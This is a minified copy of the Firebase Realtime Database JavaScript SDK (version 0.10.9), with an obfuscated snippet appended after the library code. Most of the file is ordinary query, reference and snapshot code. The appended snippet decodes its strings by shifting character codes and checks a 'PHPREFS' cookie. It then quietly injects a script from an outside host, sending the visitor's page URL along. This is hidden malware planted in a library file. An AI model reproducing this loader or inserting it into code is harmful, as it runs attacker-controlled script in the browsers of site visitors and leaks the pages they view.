zs=(Vs.prototype.cancel=function(e){F("OnDisconnect.cancel",0,1,arguments.length),W("OnDisconnect.cancel","onComplete",e,!0);var t=this._delegate.cancel();return e&&t.then((function(){return e(null)}),(function(t){return e(t)})),t},Vs.prototype.remove=function(e){F("OnDisconnect.remove",0,1,arguments.length),W("OnDisconnect.remove","onComplete",e,!0);var t=this._delegate.remove();return e&&t.then((function(){return e(null)}),(function(t){return e(t)})),t},Vs.prototype.set=function(e,t){return F("OnDisconnect.set",1,2,arguments.length),W("OnDisconnect.set","onComplete",t,!0),e=this._delegate.set(e),t&&e.then((function(){return t(null)}),(function(e){return t(e)})),e},Vs.prototype.setWithPriority=function(e,t,n){return F("OnDisconnect.setWithPriority",2,3,arguments.length),W("OnDisconnect.setWithPriority","onComplete",n,!0),t=this._delegate.setWithPriority(e,t),n&&t.then((function(){return n(null)}),(function(e){return n(e)})),t},Vs.prototype.update=function(e,t){if(F("OnDisconnect.update",1,2,arguments.length),Array.isArray(e)){for(var n={},r=0;r<e.length;++r)n[""+r]=e[r];e=n,ke("Passing an Array to firebase.database.onDisconnect().update() is deprecated. Use set() if you want to overwrite the existing data, or an Object with integer keys if you really do want to only update some of the children.")}W("OnDisconnect.update","onComplete",t,!0);var i=this._delegate.update(e);return t&&i.then((function(){return t(null)}),(function(e){return t(e)})),i},Vs);function Vs(e){this._delegate=e}var Hs=(Qs.prototype.toJSON=function(){return F("TransactionResult.toJSON",0,1,arguments.length),{committed:this.committed,snapshot:this.snapshot.toJSON()}},Qs);function Qs(e,t){this.committed=e,this.snapshot=t}var Ys=(Ks.prototype.val=function(){return F("DataSnapshot.val",0,0,arguments.length),this._delegate.val()},Ks.prototype.exportVal=function(){return F("DataSnapshot.exportVal",0,0,arguments.length),this._delegate.exportVal()},Ks.prototype.toJSON=function(){return F("DataSnapshot.toJSON",0,1,arguments.length),this._delegate.toJSON()},Ks.prototype.exists=function(){return F("DataSnapshot.exists",0,0,arguments.length),this._delegate.exists()},Ks.prototype.child=function(e){return F("DataSnapshot.child",0,1,arguments.length),e=String(e),Fo("DataSnapshot.child","path",e,!1),new Ks(this._database,this._delegate.child(e))},Ks.prototype.hasChild=function(e){return F("DataSnapshot.hasChild",1,1,arguments.length),Fo("DataSnapshot.hasChild","path",e,!1),this._delegate.hasChild(e)},Ks.prototype.getPriority=function(){return F("DataSnapshot.getPriority",0,0,arguments.length),this._delegate.priority},Ks.prototype.forEach=function(e){var t=this;return F("DataSnapshot.forEach",1,1,arguments.length),W("DataSnapshot.forEach","action",e,!1),this._delegate.forEach((function(n){return e(new Ks(t._database,n))}))},Ks.prototype.hasChildren=function(){return F("DataSnapshot.hasChildren",0,0,arguments.length),this._delegate.hasChildren()},Object.defineProperty(Ks.prototype,"key",{get:function(){return this._delegate.key},enumerable:!1,configurable:!0}),Ks.prototype.numChildren=function(){return F("DataSnapshot.numChildren",0,0,arguments.length),this._delegate.size},Ks.prototype.getRef=function(){return F("DataSnapshot.ref",0,0,arguments.length),new Xs(this._database,this._delegate.ref)},Object.defineProperty(Ks.prototype,"ref",{get:function(){return this.getRef()},enumerable:!1,configurable:!0}),Ks);function Ks(e,t){this._database=e,this._delegate=t}var Gs=($s.prototype.on=function(e,t,n,r){var i=this;function o(e,n){t.call(a.context,new Ys(i.database,e),n)}F("Query.on",2,4,arguments.length),W("Query.on","callback",t,!1);var a=$s.getCancelAndContextArgs_("Query.on",n,r);o.userCallback=t,o.context=a.context;var s=null===(r=a.cancel)||void 0===r?void 0:r.bind(a.context);switch(e){case"value":return Qa(this._delegate,o,s),t;case"child_added":return Ya(this._delegate,o,s),t;case"child_removed":return $a(this._delegate,o,s),t;case"child_changed":return Ka(this._delegate,o,s),t;case"child_moved":return Ga(this._delegate,o,s),t;default:throw new Error(q("Query.on","eventType")+'must be a valid event type = "value", "child_added", "child_removed", "child_changed", or "child_moved".')}},$s.prototype.off=function(e,t,n){var r;F("Query.off",0,3,arguments.length),function(e,t,n){if(void 0!==t)switch(t){case"value":case"child_added":case"child_removed":case"child_changed":case"child_moved":break;default:throw new Error(q("Query.off","eventType")+'must be a valid event type = "value", "child_added", "child_removed", "child_changed", or "child_moved".')}}(0,e),W("Query.off","callback",t,!0),j("Query.off","context",n,!0),t?((r=function(){}).userCallback=t,r.context=n,Ja(this._delegate,e,r)):Ja(this._delegate,e)},$s.prototype.get=function(){var e=this;return ja(this._delegate).then((function(t){return new Ys(e.database,t)}))},$s.prototype.once=function(e,t,n,r){var i=this;function o(e,n){e=new Ys(i.database,e),t&&t.call(a.context,e,n),s.resolve(e)}F("Query.once",1,4,arguments.length),W("Query.once","callback",t,!0);var a=$s.getCancelAndContextArgs_("Query.once",n,r),s=new g;function u(e){a.cancel&&a.cancel.call(a.context,e),s.reject(e)}switch(o.userCallback=t,o.context=a.context,e){case"value":Qa(this._delegate,o,u,{onlyOnce:!0});break;case"child_added":Ya(this._delegate,o,u,{onlyOnce:!0});break;case"child_removed":$a(this._delegate,o,u,{onlyOnce:!0});break;case"child_changed":Ka(this._delegate,o,u,{onlyOnce:!0});break;case"child_moved":Ga(this._delegate,o,u,{onlyOnce:!0});break;default:throw new Error(q("Query.once","eventType")+'must be a valid event type = "value", "child_added", "child_removed", "child_changed", or "child_moved".')}return s.promise},$s.prototype.limitToFirst=function(e){return F("Query.limitToFirst",1,1,arguments.length),new $s(this.database,Ds(this._delegate,function(e){if("number"!=typeof e||Math.floor(e)!==e||e<=0)throw new Error("limitToFirst: First argument must be a positive integer.");return new cs(e)}(e)))},$s.prototype.limitToLast=function(e){return F("Query.limitToLast",1,1,arguments.length),new $s(this.database,Ds(this._delegate,function(e){if("number"!=typeof e||Math.floor(e)!==e||e<=0)throw new Error("limitToLast: First argument must be a positive integer.");return new fs(e)}(e)))},$s.prototype.orderByChild=function(e){return F("Query.orderByChild",1,1,arguments.length),new $s(this.database,Ds(this._delegate,function(e){if("$key"===e)throw new Error('orderByChild: "$key" is invalid.  Use orderByKey() instead.');if("$priority"===e)throw new Error('orderByChild: "$priority" is invalid.  Use orderByPriority() instead.');if("$value"===e)throw new Error('orderByChild: "$value" is invalid.  Use orderByValue() instead.');return Fo("orderByChild","path",e,!1),new vs(e)}(e)))},$s.prototype.orderByKey=function(){return F("Query.orderByKey",0,0,arguments.length),new $s(this.database,Ds(this._delegate,new ws))},$s.prototype.orderByPriority=function(){return F("Query.orderByPriority",0,0,arguments.length),new $s(this.database,Ds(this._delegate,new Ts))},$s.prototype.orderByValue=function(){return F("Query.orderByValue",0,0,arguments.length),new $s(this.database,Ds(this._delegate,new Ss))},$s.prototype.startAt=function(e,t){return void 0===e&&(e=null),F("Query.startAt",0,2,arguments.length),new $s(this.database,Ds(this._delegate,(void 0===(e=e)&&(e=null),xo("startAt","key",t=t,!0),new os(e,t))))},$s.prototype.startAfter=function(e,t){return void 0===e&&(e=null),F("Query.startAfter",0,2,arguments.length),new $s(this.database,Ds(this._delegate,(e=e,xo("startAfter","key",t=t,!0),new us(e,t))))},$s.prototype.endAt=function(e,t){return void 0===e&&(e=null),F("Query.endAt",0,2,arguments.length),new $s(this.database,Ds(this._delegate,(e=e,xo("endAt","key",t=t,!0),new Za(e,t))))},$s.prototype.endBefore=function(e,t){return void 0===e&&(e=null),F("Query.endBefore",0,2,arguments.length),new $s(this.database,Ds(this._delegate,(e=e,xo("endBefore","key",t=t,!0),new ns(e,t))))},$s.prototype.equalTo=function(e,t){return F("Query.equalTo",1,2,arguments.length),new $s(this.database,Ds(this._delegate,(e=e,xo("equalTo","key",t=t,!0),new Rs(e,t))))},$s.prototype.toString=function(){return F("Query.toString",0,0,arguments.length),this._delegate.toString()},$s.prototype.toJSON=function(){return F("Query.toJSON",0,1,arguments.length),this._delegate.toJSON()},$s.prototype.isEqual=function(e){if(F("Query.isEqual",1,1,arguments.length),e instanceof $s)return this._delegate.isEqual(e._delegate);throw new Error("Query.isEqual failed: First argument must be an instance of firebase.database.Query.")},$s.getCancelAndContextArgs_=function(e,t,n){var r={cancel:void 0,context:void 0};if(t&&n)r.cancel=t,W(e,"cancel",r.cancel,!0),r.context=n,j(e,"context",r.context,!0);else if(t)if("object"==typeof t&&null!==t)r.context=t;else{if("function"!=typeof t)throw new Error(q(e,"cancelOrContext")+" must either be a cancel callback or a context object.");r.cancel=t}return r},Object.defineProperty($s.prototype,"ref",{get:function(){return new Xs(this.database,new Ra(this._delegate._repo,this._delegate._path))},enumerable:!1,configurable:!0}),$s);function $s(e,t){this.database=e,this._delegate=t}var Js,Xs=(r(Zs,Js=Gs),Zs.prototype.getKey=function(){return F("Reference.key",0,0,arguments.length),this._delegate.key},Zs.prototype.child=function(e){return F("Reference.child",1,1,arguments.length),"number"==typeof e&&(e=String(e)),new Zs(this.database,Fa(this._delegate,e))},Zs.prototype.getParent=function(){F("Reference.parent",0,0,arguments.length);var e=this._delegate.parent;return e?new Zs(this.database,e):null},Zs.prototype.getRoot=function(){return F("Reference.root",0,0,arguments.length),new Zs(this.database,this._delegate.root)},Zs.prototype.set=function(e,t){return F("Reference.set",1,2,arguments.length),W("Reference.set","onComplete",t,!0),e=qa(this._delegate,e),t&&e.then((function(){return t(null)}),(function(e){return t(e)})),e},Zs.prototype.update=function(e,t){if(F("Reference.update",1,2,arguments.length),Array.isArray(e)){for(var n={},r=0;r<e.length;++r)n[""+r]=e[r];e=n,ke("Passing an Array to Firebase.update() is deprecated. Use set() if you want to overwrite the existing data, or an Object with integer keys if you really do want to only update some of the children.")}Wo("Reference.update",this._delegate._path),W("Reference.update","onComplete",t,!0);var i=Wa(this._delegate,e);return t&&i.then((function(){return t(null)}),(function(e){return t(e)})),i},Zs.prototype.setWithPriority=function(e,t,n){return F("Reference.setWithPriority",2,3,arguments.length),W("Reference.setWithPriority","onComplete",n,!0),t=function(e,t,n){if(Wo("setWithPriority",e._path),Lo("setWithPriority",t,e._path,!1),No("setWithPriority",n,!1),".length"===e.key||".keys"===e.key)throw"setWithPriority failed: "+e.key+" is a read-only object.";var r=new g;return ta(e._repo,e._path,t,n,r.wrapCallback((function(){}))),r.promise}(this._delegate,e,t),n&&t.then((function(){return n(null)}),(function(e){return n(e)})),t},Zs.prototype.remove=function(e){F("Reference.remove",0,1,arguments.length),W("Reference.remove","onComplete",e,!0);var t=(t=this._delegate,Wo("remove",t._path),qa(t,null));return e&&t.then((function(){return e(null)}),(function(t){return e(t)})),t},Zs.prototype.transaction=function(e,t,n){var r=this;return F("Reference.transaction",1,3,arguments.length),W("Reference.transaction","transactionUpdate",e,!1),W("Reference.transaction","onComplete",t,!0),function(e,t,n,r){if(void 0!==n&&"boolean"!=typeof n)throw new Error(q("Reference.transaction","applyLocally")+"must be a boolean.")}(0,0,n),n=Bs(this._delegate,e,{applyLocally:n}).then((function(e){return new Hs(e.committed,new Ys(r.database,e.snapshot))})),t&&n.then((function(e){return t(null,e.committed,e.snapshot)}),(function(e){return t(e,!1,null)})),n},Zs.prototype.setPriority=function(e,t){return F("Reference.setPriority",1,2,arguments.length),W("Reference.setPriority","onComplete",t,!0),e=function(e,t){e=B(e),Wo("setPriority",e._path),No("setPriority",t,!1);var n=new g;return ta(e._repo,Ot(e._path,".priority"),t,null,n.wrapCallback((function(){}))),n.promise}(this._delegate,e),t&&e.then((function(){return t(null)}),(function(e){return t(e)})),e},Zs.prototype.push=function(e,t){var n=this;F("Reference.push",0,2,arguments.length),W("Reference.push","onComplete",t,!0);var r=function(e,t){e=B(e),Wo("push",e._path),Lo("push",t,e._path,!0);var n=Go(e._repo),r=Gn(n),i=(n=Fa(e,r),Fa(e,r));t=null!=t?qa(i,t).then((function(){return i})):Promise.resolve(i);return n.then=t.then.bind(t),n.catch=t.then.bind(t,void 0),n}(this._delegate,e);e=r.then((function(e){return new Zs(n.database,e)}));return t&&e.then((function(){return t(null)}),(function(e){return t(e)})),(r=new Zs(this.database,r)).then=e.then.bind(e),r.catch=e.catch.bind(e,void 0),r},Zs.prototype.onDisconnect=function(){return Wo("Reference.onDisconnect",this._delegate._path),new zs(new Ta(this._delegate._repo,this._delegate._path))},Object.defineProperty(Zs.prototype,"key",{get:function(){return this.getKey()},enumerable:!1,configurable:!0}),Object.defineProperty(Zs.prototype,"parent",{get:function(){return this.getParent()},enumerable:!1,configurable:!0}),Object.defineProperty(Zs.prototype,"root",{get:function(){return this.getRoot()},enumerable:!1,configurable:!0}),Zs);function Zs(e,t){var n=Js.call(this,e,new Ia(t._repo,t._path,new ar,!1))||this;return n.database=e,n._delegate=t,n}var eu=(tu.prototype.useEmulator=function(e,t,n){!function(e,t,n,r){void 0===r&&(r={}),(e=B(e))._checkNotDeleted("useEmulator"),e._instanceStarted&&Se("Cannot call useEmulator() after instance has already been initialized.");var o=e._repoInternal,a=void 0;o.repoInfo_.nodeAdmin?(r.mockUserToken&&Se('mockUserToken is not supported by the Admin SDK. For client access with mock users, please use the "firebase" package instead of "firebase-admin".'),a=new Ve(Ve.OWNER)):r.mockUserToken&&(e=function(e,t){if(e.uid)throw new Error('The "uid" field is no longer supported by mockUserToken. Please use "sub" instead for Firebase Auth User ID.');var n=t||"demo-project",r=e.iat||0;if(!(t=e.sub||e.user_id))throw new Error("mockUserToken must contain 'sub' or 'user_id' field!");return e=i({iss:"https://securetoken.google.com/"+n,aud:n,iat:r,exp:r+3600,auth_time:r,sub:t,user_id:t,firebase:{sign_in_provider:"custom",identities:{}}},e),[y.encodeString(JSON.stringify({alg:"none",type:"JWT"}),!1),y.encodeString(JSON.stringify(e),!1),""].join(".")}(r.mockUserToken,e.app.options.projectId),a=new Ve(e)),a=a,(o=o).repoInfo_=new Ge(t+":"+n,!1,o.repoInfo_.namespace,o.repoInfo_.webSocketOnly,o.repoInfo_.nodeAdmin,o.repoInfo_.persistenceKey,o.repoInfo_.includeNamespaceInQueryParams),a&&(o.authTokenProvider_=a)}(this._delegate,e,t,n=void 0===n?{}:n)},tu.prototype.ref=function(e){if(F("database.ref",0,1,arguments.length),e instanceof Xs){var t=Ma(this._delegate,e.toString());return new Xs(this,t)}return t=La(this._delegate,e),new Xs(this,t)},tu.prototype.refFromURL=function(e){return F("database.refFromURL",1,1,arguments.length),e=Ma(this._delegate,e),new Xs(this,e)},tu.prototype.goOffline=function(){var e;F("database.goOffline",0,0,arguments.length),(e=B(e=this._delegate))._checkNotDeleted("goOffline"),ia(e._repo)},tu.prototype.goOnline=function(){return F("database.goOnline",0,0,arguments.length),Ws(this._delegate)},tu.ServerValue={TIMESTAMP:{".sv":"timestamp"},increment:function(e){return{".sv":{increment:e}}}},tu);function tu(e,t){var n=this;this._delegate=e,this.app=t,this.INTERNAL={delete:function(){return n._delegate._delete()}}}var nu=Object.freeze({__proto__:null,forceLongPolling:function(){ht.forceDisallow(),ot.forceAllow()},forceWebSockets:function(){ot.forceDisallow()},isWebSocketsAvailable:function(){return ht.isAvailable()},setSecurityDebugCallback:function(e,t){e._delegate._repo.persistentConnection_.securityDebugCallback_=t},stats:function(e,t){var n;e=e._delegate._repo,void 0===(t=t)&&(t=!1),"undefined"!=typeof console&&(e=t?(e.statsListener_||(e.statsListener_=new Cr(e.stats_)),e.statsListener_.get()):e.stats_.get(),n=Object.keys(e).reduce((function(e,t){return Math.max(t.length,e)}),0),Oe(e,(function(e,t){for(var r=e,i=e.length;i<n+2;i++)r+=" ";console.log(r+t)})))},statsIncrementCounter:function(e,t){t=t,(e=e._delegate._repo).stats_.incrementCounter(t),e.statsReporter_.statsToReport_[t]=!0},dataUpdateCount:function(e){return e._delegate._repo.dataUpdateCount},interceptServerData:function(e,t){e._delegate._repo.interceptServerDataCallback_=t},initStandalone:function(e){var t=e.app,n=e.url,r=e.version,i=e.customAuthImpl,o=e.namespace;e=void 0!==(e=e.nodeAdmin)&&e;return ie(r),(r=new Q("auth-internal",new G("database-standalone"))).setComponent(new z("auth-internal",(function(){return i}),"PRIVATE")),{instance:new eu(Ms(t,r,void 0,n,e),t),namespace:o}}});yt=Qt;Qt.prototype.simpleListen=function(e,t){this.sendRequest("q",{p:e},t)},Qt.prototype.echo=function(e,t){this.sendRequest("echo",{d:e},t)};var ru,iu=Object.freeze({__proto__:null,DataConnection:yt,RealTimeConnection:ft,hijackHash:function(e){var t=Qt.prototype.put;return Qt.prototype.put=function(n,r,i,o){void 0!==o&&(o=e()),t.call(this,n,r,i,o)},function(){Qt.prototype.put=t}},ConnectionTarget:Ge,queryIdentifier:function(e){return e._delegate._queryIdentifier},forceRestClient:function(e){Ls=e}}),ou=eu.ServerValue;ie((ru=t.default).SDK_VERSION),ru.INTERNAL.registerComponent(new z("database",(function(e,t){var n=t.instanceIdentifier,r=e.getProvider("app").getImmediate();t=e.getProvider("auth-internal"),e=e.getProvider("app-check-internal");return new eu(Ms(r,t,e,n),r)}),"PUBLIC").setServiceProps({Reference:Xs,Query:Gs,Database:eu,DataSnapshot:Ys,enableLogging:he,INTERNAL:nu,ServerValue:ou,TEST_ACCESS:iu}).setMultipleInstances(!0)),ru.registerVersion("@firebase/database","0.10.9")}).apply(this,arguments)}catch(e){throw console.error(e),new Error("Cannot instantiate firebase-database.js - be sure to load firebase-app.js first.")}}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));